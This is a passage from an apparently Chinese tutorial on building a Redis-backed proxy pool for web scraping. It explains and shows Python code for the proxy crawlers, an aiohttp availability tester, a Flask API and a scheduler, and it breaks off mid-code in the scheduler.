title="获取模块"></a>获取模块</h3><p>获取模块主要是为了从各大网站抓取代理并调用存储模块进行保存，代码实现见 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUHJveHlQb29sL3RyZWUvbWFzdGVyL3Byb3h5cG9vbC9jcmF3bGVyc+OAgg==">https://github.com/Python3WebSpider/ProxyPool/tree/master/proxypool/crawlers。<i class="fa fa-external-link-alt"></i></span></p><p>获取模块的逻辑相对简单，比如我们可以定义一些抓取代理的方法，示例如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> proxypool.crawlers.base <span class="keyword">import</span> BaseCrawler</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas.proxy <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAX_PAGE = <span class="number">5</span></span><br><span class="line">BASE_URL = <span class="string">'http://www.ip3366.net/free/?stype=1&amp;page=&#123;page&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP3366Crawler</span><span class="params">(BaseCrawler)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ip3366 crawler, http://www.ip3366.net/</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    urls = [BASE_URL.format(page=i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, html)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        parse html file to get proxies</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        ip_address = re.compile(<span class="string">'&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;'</span>)</span><br><span class="line">        <span class="comment"># \s * 匹配空格，起到换行作用</span></span><br><span class="line">        re_ip_address = ip_address.findall(html)</span><br><span class="line">        <span class="keyword">for</span> address, port <span class="keyword">in</span> re_ip_address:</span><br><span class="line">            proxy = Proxy(host=address.strip(), port=int(port.strip()))</span><br><span class="line">            <span class="keyword">yield</span> proxy</span><br></pre>      </td>    </tr>  </table></figure><p>这里定义了一个代理类 <code>Crawler</code>，用来抓取某一网站的代理，这里抓取的是 IP3366 的公开代理，通过 <code>parse</code> 方法来解析页面的源码并构造一个个 Proxy 对象返回即可。</p><p>另外，在其父类 <code>BaseCrawler</code> 里面定义了通用的页面抓取方法，它可以读取子类里面定义的 <code>urls</code> 全局变量并进行爬取，然后调用子类的 <code>parse</code> 方法来解析页面，代码实现如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseCrawler</span><span class="params">(object)</span>:</span></span><br><span class="line">    urls = []</span><br><span class="line"></span><br><span class="line"><span class="meta">    @retry(stop_max_attempt_number=3, retry_on_result=lambda x: x is None)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">(self, url, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, **kwargs)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">except</span> requests.ConnectionError:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @logger.catch</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        crawl main method</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> self.urls:</span><br><span class="line">            logger.info(<span class="string">f'fetching <span class="subst">&#123;url&#125;</span>'</span>)</span><br><span class="line">            html = self.fetch(url)</span><br><span class="line">            <span class="keyword">for</span> proxy <span class="keyword">in</span> self.parse(html):</span><br><span class="line">                logger.info(<span class="string">f'fetched proxy <span class="subst">&#123;proxy.string()&#125;</span> from <span class="subst">&#123;url&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">yield</span> proxy</span><br></pre>      </td>    </tr>  </table></figure><p>如果要扩展一个代理的 <code>Crawler</code>，只需要集成 <code>BaseCrawler</code> 并实现 <code>parse</code> 方法即可，扩展性较好。</p><p>因此，这一个个的 <code>Crawler</code> 就可以针对各个不同的代理网站进行代理的抓取。最后，有一个统一的方法将 <code>Crawler</code> 汇总起来，遍历调用即可。</p><p>如何汇总呢？这里我们可以检测代码只要定义有 <code>BaseCrawler</code> 的子类就算一个有效的代理 <code>Crawler</code>，可以直接通过遍历 Python 文件包的方式来获取，代码实现如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> pkgutil</span><br><span class="line"><span class="keyword">from</span> .base <span class="keyword">import</span> BaseCrawler</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># load classes subclass of BaseCrawler</span></span><br><span class="line">classes = []</span><br><span class="line"><span class="keyword">for</span> loader, name, is_pkg <span class="keyword">in</span> pkgutil.walk_packages(__path__):</span><br><span class="line">    module = loader.find_module(name).load_module(name)</span><br><span class="line">    <span class="keyword">for</span> name, value <span class="keyword">in</span> inspect.getmembers(module):</span><br><span class="line">        globals()[name] = value</span><br><span class="line">        <span class="keyword">if</span> inspect.isclass(value) <span class="keyword">and</span> issubclass(value, BaseCrawler) <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">not</span> BaseCrawler:</span><br><span class="line">            classes.append(value)</span><br><span class="line">__all__ = __ALL__ = classes</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们调用了 <code>walk_packages</code> 方法，遍历了整个 crawlers 模块下的类，并判断它是 <code>BaseCrawler</code> 的子类，那就将其添加到结果中并返回。</p><p>最后，只要将 <code>classes</code> 遍历并依次实例化，调用其 <code>crawl</code> 方法即可完成代理的爬取和提取，代码实现见 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUHJveHlQb29sL2Jsb2IvbWFzdGVyL3Byb3h5cG9vbC9wcm9jZXNzb3JzL2dldHRlci5weeOAgg==">https://github.com/Python3WebSpider/ProxyPool/blob/master/proxypool/processors/getter.py。<i class="fa fa-external-link-alt"></i></span></p><h3 id="检测模块"><a href="#检测模块" class="headerlink" title="检测模块"></a>检测模块</h3><p>我们已经成功将各个网站的代理获取下来了，现在需要一个检测模块来对所有代理进行多轮检测。代理检测可用，分数就设置为 100，代理不可用，分数就减 1，这样可以实时改变每个代理的可用情况。如果要获取有效代理，只需要获取分数高的代理即可。</p><p>由于代理的数量非常多，为了提高代理的检测效率，这里使用异步请求库 aiohttp 来检测。</p><p>requests 作为一个同步请求库，我们在发出一个请求之后，程序需要等待网页加载完成之后才能继续执行。也就是这个过程会阻塞等待响应，如果服务器响应非常慢，比如一个请求等待十几秒，那么我们使用 requests 完成一个请求就会需要十几秒的时间，程序也不会继续往下执行，而在这十几秒的时间里，程序其实完全可以去做其他的事情，比如调度其他的请求或者进行网页解析等。</p><p>对于响应速度比较快的网站来说，requests 同步请求和 aiohttp 异步请求的效果差距没那么大。可对于检测代理来说，检测一个代理一般需要十多秒甚至几十秒的时间，这时候使用 aiohttp 异步请求库的优势就大大体现出来了，效率可能会提高几十倍不止。</p><p>所以，我们的代理检测使用异步请求库 aiohttp，实现示例如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">from</span> proxypool.storages.redis <span class="keyword">import</span> RedisClient</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> TEST_TIMEOUT, TEST_BATCH, TEST_URL, TEST_VALID_STATUS</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientProxyConnectionError, ServerDisconnectedError, ClientOSError, ClientHttpProxyError</span><br><span class="line"><span class="keyword">from</span> asyncio <span class="keyword">import</span> TimeoutError</span><br><span class="line"></span><br><span class="line">EXCEPTIONS = (</span><br><span class="line">    ClientProxyConnectionError,</span><br><span class="line">    ConnectionRefusedError,</span><br><span class="line">    TimeoutError,</span><br><span class="line">    ServerDisconnectedError,</span><br><span class="line">    ClientOSError,</span><br><span class="line">    ClientHttpProxyError</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tester</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    tester for testing proxies in queue</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        init redis</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.redis = RedisClient()</span><br><span class="line">        self.loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self, proxy: Proxy)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        test single proxy</span></span><br><span class="line"><span class="string">        :param proxy: Proxy object</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=<span class="literal">False</span>)) <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                logger.debug(<span class="string">f'testing <span class="subst">&#123;proxy.string()&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> session.get(TEST_URL, proxy=<span class="string">f'http://<span class="subst">&#123;proxy.string()&#125;</span>'</span>, timeout=TEST_TIMEOUT,</span><br><span class="line">                                       allow_redirects=<span class="literal">False</span>) <span class="keyword">as</span> response:</span><br><span class="line">                    <span class="keyword">if</span> response.status <span class="keyword">in</span> TEST_VALID_STATUS:</span><br><span class="line">                        self.redis.max(proxy)</span><br><span class="line">                        logger.debug(<span class="string">f'proxy <span class="subst">&#123;proxy.string()&#125;</span> is valid, set max score'</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self.redis.decrease(proxy)</span><br><span class="line">                        logger.debug(<span class="string">f'proxy <span class="subst">&#123;proxy.string()&#125;</span> is invalid, decrease score'</span>)</span><br><span class="line">            <span class="keyword">except</span> EXCEPTIONS:</span><br><span class="line">                self.redis.decrease(proxy)</span><br><span class="line">                logger.debug(<span class="string">f'proxy <span class="subst">&#123;proxy.string()&#125;</span> is invalid, decrease score'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @logger.catch</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        test main method</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># event loop of aiohttp</span></span><br><span class="line">        logger.info(<span class="string">'stating tester...'</span>)</span><br><span class="line">        count = self.redis.count()</span><br><span class="line">        logger.debug(<span class="string">f'<span class="subst">&#123;count&#125;</span> proxies to test'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count, TEST_BATCH):</span><br><span class="line">            <span class="comment"># start end end offset</span></span><br><span class="line">            start, end = i, min(i + TEST_BATCH, count)</span><br><span class="line">            logger.debug(<span class="string">f'testing proxies from <span class="subst">&#123;start&#125;</span> to <span class="subst">&#123;end&#125;</span> indices'</span>)</span><br><span class="line">            proxies = self.redis.batch(start, end)</span><br><span class="line">            tasks = [self.test(proxy) <span class="keyword">for</span> proxy <span class="keyword">in</span> proxies]</span><br><span class="line">            <span class="comment"># run tasks using event loop</span></span><br><span class="line">            self.loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tester = Tester()</span><br><span class="line">    tester.run()</span><br></pre>      </td>    </tr>  </table></figure><p>这里定义了一个类 <code>Tester</code>，<code>__init__</code> 方法中建立了一个 <code>RedisClient</code> 对象，供该对象中其他方法使用。接下来，定义了一个 <code>test</code> 方法，这个方法用来检测单个代理的可用情况，其参数就是被检测的代理。注意，<code>test</code> 方法前面加了 <code>async</code> 关键词，这代表这个方法是异步的。方法内部首先创建了 aiohttp 的 <code>ClientSession</code> 对象，可以直接调用该对象的 <code>get</code> 方法来访问页面。</p><p>测试链接在这里定义为常量 <code>TEST_URL</code>。如果针对某个网站有抓取需求，建议将 <code>TEST_URL</code> 设置为目标网站的地址，因为在抓取过程中，代理本身可能是可用的，但是该代理的 IP 已经被目标网站封掉了。例如，某些代理可以正常访问百度等页面，但是对知乎来说可能就被封了，所以我们可以将 <code>TEST_URL</code> 设置为知乎的某个页面的链接。当请求失败、代理被封时，分数自然会减下来，失效的代理就不会被取到了。</p><p>如果想做一个通用的代理池，则不需要专门设置 <code>TEST_URL</code>，既可以将其设置为一个不会封 IP 的网站，也可以设置为百度这类响应稳定的网站。</p><p>我们还定义了 <code>TEST_VALID_STATUS</code> 变量，这个变量是一个列表形式，包含了正常的状态码，如可以定义成 <code>[200]</code>。当然，某些目标网站可能会出现其他的状态码，可以自行配置。</p><p>程序在获取响应后需要判断响应的状态，如果状态码在 <code>TEST_VALID_STATUS</code> 列表里，则代表代理可用，可以调用 <code>RedisClient</code> 的 <code>max</code> 方法将代理分数设为 100，否则调用 <code>decrease</code> 方法将代理分数减 1，如果出现异常，也同样将代理分数减 1。</p><p>另外，我们设置了批量测试的最大值 <code>TEST_BATCH</code>，也就是一批测试最多 <code>TEST_BATCH</code> 个，这可以避免代理池过大时一次性测试全部代理导致内存开销过大的问题。当然，也可以用信号量来实现并发控制。</p><p>随后，在 <code>run</code> 方法里面获取了所有的代理列表，使用 aiohttp 分配任务，启动运行。这样在不断的运行过程中，代理池中无效代理的分数会一直被减 1，直至被清除，有效的代理则会一直保持 100 分，供随时取用。</p><p>这样测试模块的逻辑就完成了。</p><h3 id="接口模块"><a href="#接口模块" class="headerlink" title="接口模块"></a>接口模块</h3><p>通过上述 3 个模块，我们已经可以做到代理的获取、检测和更新，数据库就会以有序集合的形式存储各个代理及其对应的分数，分数 100 代表可用，分数越小代表越不可用。</p><p>但是我们怎样方便地获取可用代理呢？可以用 <code>RedisClient</code> 类直接连接 Redis，然后调用 <code>random</code> 方法。这样做没问题，效率很高，但是会有几个弊端。</p><ul>  <li>如果其他人使用这个代理池，他需要知道 Redis 连接的用户名和密码信息，这样很不安全。</li>  <li>如果代理池需要部署在远程服务器上运行，而远程服务器的 Redis 只允许本地连接，那么我们就不能远程直连 Redis 来获取代理。</li>  <li>如果爬虫所在的主机没有连接 Redis 模块，或者爬虫不是由 Python 语言编写的，那么我们就无法使用 <code>RedisClient</code> 来获取代理。</li>  <li>如果 <code>RedisClient</code> 类或者数据库结构有更新，那么爬虫端必须同步这些更新，这样非常麻烦。</li></ul><p>综上考虑，为了使代理池可以作为一个独立服务运行，我们最好增加一个接口模块，并以 Web API 的形式暴露可用代理。</p><p>这样一来，获取代理只需要请求接口即可，以上的几个缺点也可以避免。</p><p>我们使用一个比较轻量级的库 Flask 来实现这个接口模块，实现示例如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, g</span><br><span class="line"><span class="keyword">from</span> proxypool.storages.redis <span class="keyword">import</span> RedisClient</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> API_HOST, API_PORT, API_THREADED</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">'app'</span>]</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get redis client object</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(g, <span class="string">'redis'</span>):</span><br><span class="line">        g.redis = RedisClient()</span><br><span class="line">    <span class="keyword">return</span> g.redis</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get home page, you can define your own templates</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h2&gt;Welcome to Proxy Pool System&lt;/h2&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/random')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get a random proxy</span></span><br><span class="line"><span class="string">    :return: get a random proxy</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    <span class="keyword">return</span> conn.random().string()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/count')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_count</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get the count of proxies</span></span><br><span class="line"><span class="string">    :return: count, int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    <span class="keyword">return</span> str(conn.count())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=API_HOST, port=API_PORT, threaded=API_THREADED)</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们声明了一个 Flask 对象，定义了 3 个接口，分别是首页、随机代理页和获取数量页。</p><p>运行之后，Flask 会启动一个 Web 服务，我们只需要访问对应的接口即可获取到可用代理。</p><h3 id="调度模块"><a href="#调度模块" class="headerlink" title="调度模块"></a>调度模块</h3><p>调度模块就是调用上面所定义的 3 个模块，将这 3 个模块通过多进程的形式运行起来，示例如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.server <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.getter <span class="keyword">import</span> Getter</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.tester <span class="keyword">import</span> Tester</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> CYCLE_GETTER, CYCLE_TESTER, API_HOST, API_THREADED, API_PORT, ENABLE_SERVER, \</span><br><span class="line">    ENABLE_GETTER, ENABLE_TESTER, IS_WINDOWS</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> IS_WINDOWS:</span><br><span class="line">    multiprocessing.freeze_support()</span><br><span class="line"></span><br><span class="line">tester_process, getter_process, server_process = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scheduler</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    scheduler</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_tester</span><span class="params">(self, cycle=CYCLE_TESTER)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        run tester</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_TESTER:</span><br><span class="line">            logger.info(<span class="string">'tester not enabled, exit'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        tester = Tester()</span><br><span class="line">        loop = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f'tester loop <span class="subst">&#123;loop&#125;</span> start...'</span>)</span><br><span class="line">            tester.run()</span><br><span class="line">            loop += <span class="number">1</span></span><br><span class="line">            time.sleep(cycle)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_getter</span><span class="params">(self, cycle=CYCLE_GETTER)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        run getter</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_GETTER:</span><br><span class="line">            logger.info(<span class="string">'getter not enabled, exit'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        getter = Getter()</span><br><span class="line">        loop = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f'getter loop <span class="subst">&#123;loop&#125;</span> start...'</span>)</span><br><span class="line">            getter.run()</span><br><span class="line">            loop += <span class="number">1</span></span><br><span class="line">            time.sleep(cycle)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_server</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        run server for api</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_SERVER:</span><br><span class="line">            logger.info(<span class="string">'server not enabled, exit'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        app.run(host=API_HOST, port=API_PORT, threaded=API_THREADED)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> tester_process, getter_process, server_process</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logger.info(<span 